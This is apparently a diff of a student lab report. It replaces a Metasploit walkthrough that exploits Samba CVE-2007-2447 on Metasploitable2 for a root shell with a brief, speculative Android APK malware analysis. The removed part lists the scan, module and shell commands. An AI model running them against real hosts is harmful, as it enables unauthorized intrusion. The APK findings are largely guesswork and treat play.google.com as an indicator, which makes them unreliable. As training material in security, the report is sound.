@@ -1,234 +1,148 @@
-# Week 5 Lab Task — System Hacking & Malware Analysis
+# Week 5 Lab Task — Malware Analysis
 
-## Exploitation Report – Samba Remote Shell Access
+## Analysis Report – Suspicious Android APK
 
 ---
 
 ## Objective
 
-Demonstrate how a vulnerable Samba service can be identified and exploited to gain remote shell access on a target machine.
+Analyze a malware sample to identify its behavior, possible impact, indicators of compromise, and recommended mitigation steps.
 
 ---
 
-## Lab Setup
+## Sample Information
 
-| Role     | System          | IP Address        |
-| -------- | --------------- | ----------------- |
-| Attacker | Kali Linux      | `192.168.254.128` |
-| Target   | Metasploitable2 | `192.168.254.129` |
+| Field       | Details                                                            |
+| ----------- | ------------------------------------------------------------------ |
+| File Type   | Android APK                                                        |
+| SHA256 Hash | `fe41e6c1725f63582f022a17abe098e49338a78118a00ca87785b2fa0cf3dadf` |
 
----
+<br>
 
-## Methodology
-
-A structured penetration testing process was followed:
-
-**Reconnaissance → Enumeration → Vulnerability Identification → Exploitation → Post-Exploitation**
+<img src="Screenshot/week5_11.png" width="800" alt="APK Hash">
 
 ---
 
-## 1. Scanning & Enumeration
+## 1. Static Analysis Findings
 
-An Nmap scan was performed to identify open services and versions on the target machine.
-
-### Command Used
-
-```bash
-nmap -sS -sV -n -Pn -T4 --top-ports=100 192.168.254.129
-```
+Initial static inspection revealed several suspicious indicators inside the APK file.
 
 ### Key Findings
 
-* Port `139/tcp` open
-* Port `445/tcp` open
-* Service detected: **Samba smbd**
-* Version detected: **3.0.20**
+* File identified as an **Android application package (APK)**
+* Suspicious URLs discovered:
 
-These ports indicate SMB file-sharing services exposed to the network.
+  * `https://rev.cat/...`
+  * `https://play.google.com/...`
+* Network communication library detected:
+
+  * **okhttp3**
+* Suspicious keywords present:
+
+  * `httpMethod`
+  * `login`
+  * `password`
+* Encoded or obfuscated strings found
+
+These indicators suggest hidden functionality and network communication behavior.
 
 <br>
 
-<img src="Screenshot/week5_1.png" width="800" alt="Nmap Scan">
+<img src="Screenshot/week5_12.png" width="800" alt="Static Analysis">
 
 ---
 
-## 2. Vulnerability Identification
+## 2. Behavioral Analysis
 
-The detected Samba version was researched using Searchsploit.
+The APK appears to use HTTP-based communication libraries to contact remote servers.
 
-### Command Used
+### Possible Behaviors
 
-```bash
-searchsploit samba 3.0.20
-```
+* Sends requests to external servers
+* Receives commands remotely
+* Transfers device or user data
+* Uses obfuscation to hide malicious logic
 
-### Result
-
-* Vulnerability found: **CVE-2007-2447**
-* Exploit Type: Username Map Script Command Execution
-
-This vulnerability exists because Samba improperly validates usernames in the username map script feature. An attacker can inject system commands and achieve remote code execution.
-
-<br>
-
-<img src="Screenshot/week5_2.png" width="800" alt="Searchsploit Results">
+This behavior may indicate command-and-control (C2) communication.
 
 ---
 
-## 3. Exploitation with Metasploit
+## 3. Malware Classification
 
-Metasploit Framework was used to exploit the Samba vulnerability.
+Based on observed indicators, the sample is likely a **Trojan**.
 
-### Start Metasploit
+### Reasons
 
-```bash
-msfconsole
-```
-
-<br>
-
-<img src="Screenshot/week5_3.png" width="800" alt="MSFConsole">
-
-### Search Exploit Module
-
-```bash
-search samba usermap
-```
-
-<br>
-
-<img src="Screenshot/week5_4.png" width="800" alt="Search Module">
-
-### Select Module
-
-```bash
-use exploit/multi/samba/usermap_script
-```
-
-<br>
-
-<img src="Screenshot/week5_5.png" width="800" alt="Use Exploit">
-
-### Show Options
-
-```bash
-show options
-```
-
-<br>
-
-<img src="Screenshot/week5_6.png" width="800" alt="Show Options">
-
-### Configure Target & Attacker IP
-
-```bash
-set RHOSTS 192.168.254.129
-set LHOST 192.168.254.128
-```
-
-<br>
-
-<img src="Screenshot/week5_7.png" width="800" alt="Set Options">
-
-### Run Exploit
-
-```bash
-run
-```
-
-<br>
-
-<img src="Screenshot/week5_8.png" width="800" alt="Run Exploit">
+* Communicates with remote infrastructure
+* Contains hidden or encoded strings
+* Uses networking libraries
+* May impersonate a legitimate application
 
 ---
 
-## 4. Gaining Remote Access
+## 4. Indicators of Compromise (IoCs)
 
-The exploit successfully opened a command shell session.
+| Type    | Indicator                    |
+| ------- | ---------------------------- |
+| URL     | `rev.cat/...`                |
+| URL     | `play.google.com/...`        |
+| Library | `okhttp3`                    |
+| Strings | Encoded / Obfuscated content |
 
-### Session Access
-
-```bash
-sessions 1
-```
-
-Metasploit returned:
-
-* **Command shell session 1 opened**
-
-This confirms successful remote shell access to the target.
-
-<br>
-
-<img src="Screenshot/week5_9.png" width="800" alt="Shell Access">
+These indicators can be used for detection and blocking.
 
 ---
 
-## 5. Post-Exploitation
+## 5. Attack Vector
 
-System-level access was verified using standard Linux commands.
+Possible infection methods include:
 
-### Commands Used
-
-```bash
-whoami
-id
-uname -a
-```
-
-### Results
-
-* Logged in as **root**
-* Full privileged access obtained
-* Linux system details confirmed
-
-<br>
-
-<img src="Screenshot/week5_10.png" width="800" alt="Post Exploitation">
+* Installation of malicious APK files
+* Download from third-party app stores
+* Fake software updates
+* Phishing links
+* Social engineering messages
 
 ---
 
-## Key Learnings
+## 6. Potential Impact
 
-* Open ports do not always mean vulnerability, but they increase exposure.
-* Successful exploitation requires:
+If installed, the malware may cause:
 
-  * Service identification
-  * Version detection
-  * Vulnerability mapping
-* Misconfigured or outdated Samba services can lead to full compromise.
-* Metasploitable2 is intentionally vulnerable for training purposes.
-
----
-
-## Important Concepts
-
-### Reverse Shell
-
-The exploited target connects back to the attacker machine:
-
-**Target → Attacker (LHOST)**
-
-### RHOST vs LHOST
-
-* **RHOST** = Target system
-* **LHOST** = Attacker system
+* Theft of sensitive data
+* Credential harvesting
+* Unauthorized device access
+* Background communication with attacker
+* Privacy compromise
 
 ---
 
-## Mitigation
+## 7. Remediation
 
-To secure real-world Samba systems:
+If infection is suspected:
 
-* Update Samba to the latest supported version
-* Disable username map script if unnecessary
-* Block SMB ports `139` and `445` using firewalls
-* Enforce strong authentication
-* Disable anonymous SMB access
-* Monitor suspicious SMB activity
+* Uninstall the malicious application
+* Scan device using trusted antivirus tools
+* Block suspicious domains and URLs
+* Reset passwords used on the device
+* Review app permissions
+* Monitor for unusual activity
+
+---
+
+## 8. Prevention
+
+To reduce risk:
+
+* Install apps only from trusted sources
+* Keep Android OS updated
+* Avoid unknown APK downloads
+* Use mobile endpoint protection
+* Review requested permissions before install
+* Enable Google Play Protect
 
 ---
 
 ## Conclusion
 
-This exercise demonstrates how attackers identify exposed services, map known vulnerabilities, and exploit weaknesses to gain unauthorized access. Understanding this attack path helps cybersecurity professionals strengthen defenses and detect real-world threats.
+The analyzed APK displays characteristics consistent with a Trojan-style Android malware sample. It uses network communication libraries, contains suspicious strings, and likely communicates with external servers. Strong security hygiene, trusted app sources, and regular updates are essential to prevent similar mobile threats.
